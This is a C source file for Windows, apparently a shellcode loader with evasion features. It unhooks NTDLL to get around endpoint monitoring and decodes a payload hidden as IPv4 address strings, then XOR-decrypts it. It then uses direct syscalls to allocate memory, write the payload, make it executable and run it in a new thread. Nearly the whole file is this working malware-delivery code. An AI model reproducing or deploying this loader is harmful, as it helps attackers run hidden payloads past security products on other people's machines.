#include <Windows.h>
#include <stdio.h>
#include "unhook.h"
#include "payload.h"
#include "../syscalls/syscalls.h"

typedef NTSTATUS (WINAPI *fnRtlIpv4StringToAddressA)(
    PCSTR S,
    BOOLEAN Strict,
    PCSTR* Terminator,
    PVOID Addr
);

int main(void)
{
    printf("[*] Step 1: Unhooking NTDLL...\n");
    if (!UnhookNtdll())
    {
        printf("[!] Unhooking failed\n");
        return 1;
    }
    printf("[+] NTDLL unhooked\n");

    printf("[*] Step 2: Deobfuscating IPv4 strings...\n");

    SIZE_T PayloadSize = payloadSize * 4;

    PBYTE pDeobfuscated = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PayloadSize);
    if (!pDeobfuscated)
    {
        printf("[!] HeapAlloc failed: %d\n", GetLastError());
        return 1;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    fnRtlIpv4StringToAddressA pRtlIpv4 = (fnRtlIpv4StringToAddressA)GetProcAddress(hNtdll, "RtlIpv4StringToAddressA");
    if (!pRtlIpv4)
    {
        printf("[!] GetProcAddress failed: %d\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, pDeobfuscated);
        return 1;
    }

    PBYTE pTmp = pDeobfuscated;
    for (SIZE_T i = 0; i < payloadSize; i++)
    {
        PCSTR terminator = NULL;
        NTSTATUS status = pRtlIpv4(Payload[i], FALSE, &terminator, pTmp);
        if (status != 0)
        {
            printf("[!] RtlIpv4StringToAddressA failed at [%zu]: 0x%X\n", i, status);
            HeapFree(GetProcessHeap(), 0, pDeobfuscated);
            return 1;
        }

        pTmp += 4;
    }

    printf("[+] Deobfuscated %zu bytes\n", PayloadSize);

    printf("[*] Step 3: XOR decryption... (key 0x%02X)", xorKey);
    for (SIZE_T i = 0; i < PayloadSize; i++)
    {
        pDeobfuscated[i] ^= xorKey;
    }
    printf("[+] XOR decryption done\n");

    printf("[*] Step 4: NtAllocateVirtualMemory...\n");
    PVOID pAddress = NULL;
    SIZE_T sSize = PayloadSize;

    NTSTATUS status = Sw3NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &pAddress,
        0,
        &sSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0)
    {
        printf("[!] NtAllocateVirtualMemory failed: 0x%X\n", status);
        HeapFree(GetProcessHeap(), 0, pDeobfuscated);
        return 1;
    }
    printf("[+] Memory at 0x%p (size: %zu)\n", pAddress, sSize);

    printf("[*] Step 5: NtWriteVirtualMemory\n");
    SIZE_T sWritten = 0;

    status = Sw3NtWriteVirtualMemory(
        GetCurrentProcess(),
        pAddress,
        pDeobfuscated,
        PayloadSize,
        &sWritten
    );

    HeapFree(GetProcessHeap(), 0, pDeobfuscated); // shell already copied

    if (status != 0 || sWritten != PayloadSize)
    {
        printf("[!] NtWriteVirtualMemory failed: 0x%X\n", status);
        return 1;
    }
    printf("[+] Payload written\n");

    printf("[*] Step 6: NtProtectVirtualMemory\n");
    ULONG oldProtect = 0; // NtProtectVirtualMemory required a PLONG
    SIZE_T sProtect = PayloadSize;

    status = Sw3NtProtectVirtualMemory(
        GetCurrentProcess(),
        &pAddress,
        &sProtect,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (status != 0)
    {
        printf("[!] NtProtectVirtualMemory failed: 0x%X\n", status);
        return 1;
    }
    printf("[+] Protection changed to RX (READ_AND_EXECUTE)\n");

    printf("[*] Step 7: NtCreateThreadEx\n");
    
    HANDLE hThread = NULL;
    
    status = Sw3NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        pAddress,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );

    if (status != 0)
    {
        printf("[!] NtCreateThreadEx failed: 0x%X\n", status);
        return 1;
    }
    printf("[+] Thread created\n");

    printf("[*] Step 8: NtWaitForSingleObject\n");
    status = WaitForSingleObject(hThread, INFINITE);
    if (status != 0) 
    {
        printf("[!] NtWaitForSingleObject failed: 0x%X\n", status);
        return 1;
    }

    printf("[+] Done\n");
    return 0;

}